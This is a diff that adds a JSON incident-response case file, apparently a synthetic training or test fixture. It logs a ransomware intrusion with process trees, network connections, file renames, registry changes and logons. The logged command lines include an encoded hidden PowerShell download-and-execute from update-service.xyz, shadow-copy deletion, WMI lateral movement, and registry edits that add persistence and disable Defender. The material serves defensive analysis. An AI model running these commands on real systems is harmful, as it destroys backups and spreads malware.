@@ -1,0 +1,216 @@
+{
+  "case_id": "IR-2024-001",
+  "incident_type": "suspected_ransomware",
+  "artifacts": {
+    "process_tree": [
+      {
+        "timestamp": "2024-01-15T02:12:05Z",
+        "pid": 2100,
+        "parent_pid": 1024,
+        "process_name": "WINWORD.EXE",
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Outlook\\Attachments\\Invoice_Q4_2024.docm\"",
+        "user": "CORP\\jsmith"
+      },
+      {
+        "timestamp": "2024-01-15T02:12:44Z",
+        "pid": 4521,
+        "parent_pid": 2100,
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAtAHMAZQByAHYAaQBjAGUALgB4AHkAegAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+        "user": "CORP\\jsmith"
+      },
+      {
+        "timestamp": "2024-01-15T02:14:33Z",
+        "pid": 5890,
+        "parent_pid": 4521,
+        "process_name": "svchost32.exe",
+        "command_line": "C:\\ProgramData\\svchost32.exe --encrypt --target C:\\Users --ext .LOCKED",
+        "user": "CORP\\jsmith"
+      },
+      {
+        "timestamp": "2024-01-15T02:15:10Z",
+        "pid": 6102,
+        "parent_pid": 5890,
+        "process_name": "vssadmin.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      {
+        "timestamp": "2024-01-15T02:16:02Z",
+        "pid": 6340,
+        "parent_pid": 788,
+        "process_name": "cmd.exe",
+        "command_line": "cmd.exe /c wmic /node:\"10.0.1.50\" process call create \"C:\\ProgramData\\svchost32.exe --encrypt --target C:\\Users --ext .LOCKED\"",
+        "user": "CORP\\svc_backup"
+      },
+      {
+        "timestamp": "2024-01-15T02:17:45Z",
+        "pid": 6512,
+        "parent_pid": 5890,
+        "process_name": "nltest.exe",
+        "command_line": "nltest.exe /dclist:corp.local",
+        "user": "CORP\\jsmith"
+      }
+    ],
+    "network_logs": [
+      {
+        "timestamp": "2024-01-15T02:12:50Z",
+        "src_ip": "10.0.1.45",
+        "dst_ip": "185.220.101.34",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "bytes_sent": 14336,
+        "bytes_received": 248576,
+        "domain": "update-service.xyz"
+      },
+      {
+        "timestamp": "2024-01-15T02:13:15Z",
+        "src_ip": "10.0.1.45",
+        "dst_ip": "104.18.32.7",
+        "dst_port": 53,
+        "protocol": "DNS",
+        "bytes_sent": 72,
+        "bytes_received": 156,
+        "domain": "ransom-pay.tor2web-proxy.xyz"
+      },
+      {
+        "timestamp": "2024-01-15T02:18:30Z",
+        "src_ip": "10.0.1.45",
+        "dst_ip": "20.190.159.2",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "bytes_sent": 1024,
+        "bytes_received": 4096,
+        "domain": "login.microsoftonline.com"
+      },
+      {
+        "timestamp": "2024-01-15T02:19:05Z",
+        "src_ip": "10.0.1.45",
+        "dst_ip": "91.215.85.142",
+        "dst_port": 8443,
+        "protocol": "HTTPS",
+        "bytes_sent": 524288,
+        "bytes_received": 128,
+        "domain": "cdn-static.darkcloud.cc"
+      },
+      {
+        "timestamp": "2024-01-15T02:16:10Z",
+        "src_ip": "10.0.1.45",
+        "dst_ip": "10.0.1.50",
+        "dst_port": 135,
+        "protocol": "TCP",
+        "bytes_sent": 2048,
+        "bytes_received": 1024,
+        "domain": null
+      }
+    ],
+    "file_events": [
+      {
+        "timestamp": "2024-01-15T02:11:58Z",
+        "action": "open",
+        "path": "C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Outlook\\Attachments\\Invoice_Q4_2024.docm",
+        "size_bytes": 187392,
+        "hash_sha256": "a3f2b8c91d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a"
+      },
+      {
+        "timestamp": "2024-01-15T02:13:02Z",
+        "action": "create",
+        "path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\~WRD4521.tmp",
+        "size_bytes": 65536,
+        "hash_sha256": "b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3"
+      },
+      {
+        "timestamp": "2024-01-15T02:14:10Z",
+        "action": "create",
+        "path": "C:\\ProgramData\\svchost32.exe",
+        "size_bytes": 245760,
+        "hash_sha256": "e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6"
+      },
+      {
+        "timestamp": "2024-01-15T02:20:15Z",
+        "action": "rename",
+        "path": "C:\\Users\\jsmith\\Documents\\Financial_Report_2024.xlsx.LOCKED",
+        "size_bytes": 2097152,
+        "hash_sha256": "f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7"
+      },
+      {
+        "timestamp": "2024-01-15T02:20:16Z",
+        "action": "rename",
+        "path": "C:\\Users\\jsmith\\Documents\\Project_Roadmap.pptx.LOCKED",
+        "size_bytes": 5242880,
+        "hash_sha256": "c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0"
+      },
+      {
+        "timestamp": "2024-01-15T02:20:17Z",
+        "action": "rename",
+        "path": "C:\\Users\\jsmith\\Pictures\\Family_Vacation.jpg.LOCKED",
+        "size_bytes": 3145728,
+        "hash_sha256": "d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1"
+      },
+      {
+        "timestamp": "2024-01-15T02:21:30Z",
+        "action": "create",
+        "path": "C:\\Users\\jsmith\\Desktop\\README_DECRYPT.txt",
+        "size_bytes": 2048,
+        "hash_sha256": "a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0"
+      }
+    ],
+    "registry_changes": [
+      {
+        "timestamp": "2024-01-15T02:14:45Z",
+        "action": "set_value",
+        "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "value_name": "WindowsUpdateSvc",
+        "value_data": "C:\\ProgramData\\svchost32.exe"
+      },
+      {
+        "timestamp": "2024-01-15T02:14:50Z",
+        "action": "set_value",
+        "key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+        "value_name": "DisableAntiSpyware",
+        "value_data": "1"
+      },
+      {
+        "timestamp": "2024-01-15T02:14:55Z",
+        "action": "set_value",
+        "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS",
+        "value_name": "Start",
+        "value_data": "4"
+      }
+    ],
+    "auth_logs": [
+      {
+        "timestamp": "2024-01-15T02:10:00Z",
+        "event_type": "logon_success",
+        "username": "svc_backup",
+        "source_ip": "10.0.5.200",
+        "logon_type": 3,
+        "workstation": "WS-FINANCE-04"
+      },
+      {
+        "timestamp": "2024-01-15T02:11:30Z",
+        "event_type": "logon_success",
+        "username": "CORP\\admin.jthompson",
+        "source_ip": "10.0.1.45",
+        "logon_type": 10,
+        "workstation": "DC-PRIMARY"
+      },
+      {
+        "timestamp": "2024-01-15T02:09:15Z",
+        "event_type": "logon_failure",
+        "username": "administrator",
+        "source_ip": "185.156.73.54",
+        "logon_type": 3,
+        "workstation": "WS-FINANCE-04"
+      },
+      {
+        "timestamp": "2024-01-15T02:15:45Z",
+        "event_type": "privilege_escalation",
+        "username": "CORP\\jsmith",
+        "source_ip": "10.0.1.45",
+        "logon_type": 3,
+        "workstation": "WS-FINANCE-04"
+      }
+    ]
+  }
+}
